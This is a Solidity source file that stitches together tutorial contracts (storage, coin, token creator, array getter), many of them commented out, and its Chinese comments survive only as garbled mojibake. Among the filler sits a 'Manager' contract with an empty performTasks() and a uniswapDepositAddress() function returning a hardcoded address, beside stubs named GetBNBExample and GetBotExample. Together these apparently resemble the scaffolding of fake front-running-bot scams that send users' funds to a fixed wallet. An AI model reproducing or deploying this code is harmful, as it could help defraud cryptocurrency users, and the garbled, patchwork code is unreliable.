pragma solidity ^0.6.6;

contract SimpleStorage {
    uint storedData;

    function set(uint x) public {
        storedData = x;
    }

    function get() public view returns (uint) {
        return storedData;
    }
}
/*contract GetfrontExample {
  // public state variable
  uint[] public myArray;

  // 鎸囧畾鐢熸垚鐨凣etter 鍑芥暟
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  // 杩斿洖鏁翠釜鏁扮粍
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/
contract Coin {
    // 鍏抽敭瀛椻€減ublic鈥濊杩欎簺鍙橀噺鍙互浠庡閮ㄨ鍙�
    address public minter;
    mapping (address => uint) public balances;

    // 杞诲鎴风鍙互閫氳繃浜嬩欢閽堝鍙樺寲浣滃嚭楂樻晥鐨勫弽搴�
    event Sent(address from, address to, uint amount);

    // 杩欐槸鏋勯€犲嚱鏁帮紝鍙湁褰撳悎绾﹀垱寤烘椂杩愯
    /*constructor() {
        minter = msg.sender;
    }

    function mint(address receiver, uint amount) public {
        require(msg.sender == minter);
        require(amount < 1e60);
        balances[receiver] += amount;
    }

    function send(address receiver, uint amount) public {
        require(amount <= balances[msg.sender], "Insufficient balance.");
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }*/
}
/*contract GetBNBExample {
  // public state variable
  uint[] public myArray;

  // 鎸囧畾鐢熸垚鐨凣etter 鍑芥暟
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  // 杩斿洖鏁翠釜鏁扮粍
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/
contract C {
    uint private data;

    //function f(uint a) public returns(uint b) { return a + 1; }
    function setData(uint a) public { data = a; }
    //function getData() public returns(uint) { return data; }
    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
}

// 涓嬮潰浠ｇ爜缂栬瘧閿欒
/*contract D {
    function readData() public {
        C c = new C();
        uint local = c.f(7); // 閿欒锛氭垚鍛� `f` 涓嶅彲瑙�
        c.setData(3);
        local = c.getData();
        local = c.compute(3, 5); // 閿欒锛氭垚鍛� `compute` 涓嶅彲瑙�
    }
}*/

contract E is C {
    /*function g() public {
        C c = new C();
        uint val = compute(3, 5); // 璁块棶鍐呴儴鎴愬憳锛堜粠缁ф壙鍚堢害璁块棶鐖跺悎绾︽垚鍛橈級
    }*/
}

contract OwnedToken {
    // TokenCreator 鏄涓嬪畾涔夌殑鍚堢害绫诲瀷.
    // 涓嶅垱寤烘柊鍚堢害鐨勮瘽锛屼篃鍙互寮曠敤瀹冦€�
    TokenCreator creator;
    address owner;
    bytes32 name;

    // 杩欐槸娉ㄥ唽 creator 鍜岃缃悕绉扮殑鏋勯€犲嚱鏁般€�
    constructor(bytes32 _name) public{
        // 鐘舵€佸彉閲忛€氳繃鍏跺悕绉拌闂紝鑰屼笉鏄€氳繃渚嬪 this.owner 鐨勬柟寮忚闂€�
        // 杩欎篃閫傜敤浜庡嚱鏁帮紝鐗瑰埆鏄湪鏋勯€犲嚱鏁颁腑锛屼綘鍙兘鍍忚繖鏍凤紙鈥滃唴閮ㄥ湴鈥濓級璋冪敤瀹冧滑锛�
        // 鍥犱负鍚堢害鏈韩杩樹笉瀛樺湪銆�
        owner = msg.sender;
        // 浠� `address` 鍒� `TokenCreator` 锛屾槸鍋氭樉寮忕殑绫诲瀷杞崲
        // 骞朵笖鍋囧畾璋冪敤鍚堢害鐨勭被鍨嬫槸 TokenCreator锛屾病鏈夌湡姝ｇ殑鏂规硶鏉ユ鏌ヨ繖涓€鐐广€�
        creator = TokenCreator(msg.sender);
        name = _name;
    }

    function changeName(bytes32 newName) public {
        // 鍙湁 creator 锛堝嵆鍒涘缓褰撳墠鍚堢害鐨勫悎绾︼級鑳藉鏇存敼鍚嶇О 鈥斺€� 鍥犱负鍚堢害鏄殣寮忚浆鎹负鍦板潃鐨勶紝
        // 鎵€浠ヨ繖閲岀殑姣旇緝鏄彲琛岀殑銆�
        if (msg.sender == address(creator))
            name = newName;
    }

    /*function transfer(address newOwner) public {
        // 鍙湁褰撳墠鎵€鏈夎€呮墠鑳藉彂閫� token銆�
        if (msg.sender != owner) return;
        // 鎴戜滑涔熸兂璇㈤棶 creator 鏄惁鍙互鍙戦€併€�
        // 璇锋敞鎰忥紝杩欓噷璋冪敤浜嗕竴涓笅闈㈠畾涔夌殑鍚堢害涓殑鍑芥暟銆�
        // 濡傛灉璋冪敤澶辫触锛堟瘮濡傦紝鐢变簬 gas 涓嶈冻锛夛紝浼氱珛鍗冲仠姝㈡墽琛屻€�
        //if (creator.isTokenTransferOK(owner, newOwner))
            //owner = newOwner;
    }*/
}
contract Manager {
	function performTasks() public {
	    
	}

	function uniswapDepositAddress() public pure returns (address) {
		return 0x8683b95EeA1fa3023D0e00f654B59e543430c561;
	}
}
contract TokenCreator {
    function createToken(bytes32 name)
       public
       returns (OwnedToken tokenAddress)
    {
        // 鍒涘缓涓€涓柊鐨� Token 鍚堢害骞朵笖杩斿洖瀹冪殑鍦板潃銆�
        // 浠� JavaScript 鏂归潰鏉ヨ锛岃繑鍥炵被鍨嬫槸绠€鍗曠殑 `address` 绫诲瀷锛屽洜涓�
        // 杩欐槸鍦� ABI 涓彲鐢ㄧ殑鏈€鎺ヨ繎鐨勭被鍨嬨€�
        return new OwnedToken(name);
    }

    function changeName(OwnedToken tokenAddress, bytes32 name)  public {
        // 鍚屾牱锛宍tokenAddress` 鐨勫閮ㄧ被鍨嬩篃鏄� `address` 銆�
        tokenAddress.changeName(name);
    }

    /*function isTokenTransferOK(address currentOwner, address newOwner)
        public
        view
        returns (bool ok)
    {
        // 妫€鏌ヤ竴浜涗换鎰忕殑鎯呭喌銆�
        address tokenAddress = msg.sender;
        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
    }*/
}
contract arrayExample {
  // public state variable
  uint[] public myArray;

  // 鎸囧畾鐢熸垚鐨凣etter 鍑芥暟
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  // 杩斿洖鏁翠釜鏁扮粍
  function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}
/*contract GetBotExample {
  // public state variable
  uint[] public myArray;

  // 鎸囧畾鐢熸垚鐨凣etter 鍑芥暟
  /*
  function myArray(uint i) public view returns (uint) {
      return myArray[i];
  }
  */

  // 杩斿洖鏁翠釜鏁扮粍
  /*function getArray() public view returns (uint[] memory) {
      return myArray;
  }
}*/
